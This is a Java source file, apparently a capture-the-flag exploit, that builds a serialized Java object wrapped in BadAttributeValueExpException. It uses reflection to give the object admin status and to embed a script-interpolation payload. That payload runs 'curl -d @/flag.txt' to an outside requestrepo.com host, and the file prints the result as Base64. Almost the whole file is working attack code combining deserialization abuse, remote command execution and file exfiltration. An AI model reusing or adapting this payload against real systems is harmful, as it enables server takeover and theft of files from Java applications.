package com.text.controller;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

// Press Shift twice to open the Search Everywhere dialog and type `show whitespaces`,
// then press Enter. You can now see whitespace characters in your code.
public class Main implements Serializable {
    static String serializeAndEncode(Object object) {
        try {

            // Serialize the Player object
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(object);
            oos.close();
            byte[] serializedPlayer = baos.toByteArray();

            // Encode the serialized object in Base64
            return Base64.getEncoder().encodeToString(serializedPlayer);

        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    static String deserialize(String result) {
        try {
            byte[] data = Base64.getDecoder().decode(result);
            InputStream is = new ByteArrayInputStream(data);
            ObjectInputStream ois = new ObjectInputStream(is);
            Object obj = ois.readObject();
            ois.close();
            Player user = (Player)obj;
            return ("<h1> Hello: " + user.getName() + " !</h1>");
        } catch (Exception var10) {
            return ("<h1> ????????? </h1>");
        }
    }

    public static void main(String[] args) throws IOException {

        Player a = new Player();
        Field isAdmin;
        Field name;
        String payload = "${script:javascript:java.lang.Runtime.getRuntime().exec('curl -d @/flag.txt http://bhigczrs.requestrepo.com/')}";
        BadAttributeValueExpException val;
        {
            try {
                isAdmin = Player.class.getDeclaredField("isAdmin");
                isAdmin.setAccessible(true);
                isAdmin.set(a, true);

                name = Player.class.getDeclaredField("name");
                name.setAccessible(true);
                name.set(a,payload);

                val = new BadAttributeValueExpException(null);
                Field exploit = val.getClass().getDeclaredField("val");
                exploit.setAccessible(true);
                exploit.set(val,a);

            } catch (NoSuchFieldException | IllegalAccessException e) {
                throw new RuntimeException(e);
            }
        }


        String result = serializeAndEncode(val);
        System.out.println(result);
        System.out.println(deserialize(result));

    }
}